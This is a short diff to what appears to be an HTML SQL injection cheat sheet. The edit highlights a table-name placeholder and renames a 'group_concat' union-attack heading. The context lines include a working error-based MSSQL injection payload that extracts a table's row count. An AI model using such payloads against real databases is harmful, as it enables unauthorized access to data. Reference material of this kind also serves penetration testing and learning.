@@ -270,7 +270,7 @@ layout: default
         </tr>
         <tr>
             <td>Extract number of rows in a table in current DB</td>
-            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM &lt;table name&gt;)+CHAR(58)+CHAR(58)))--</td>
+            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM <mark>&lt;table name&gt;</mark>)+CHAR(58)+CHAR(58)))--</td>
         </tr>
         <tr>
             <td>Extract data for two columns by row #</td>
@@ -399,7 +399,7 @@ layout: default
 
     <h4>SQL Injection Union Attack</h4>
 
-    <li>Quick method - Group_concat</li>
+    <li>Quick union method - group_concat</li>
 
     <table>
         <tr>
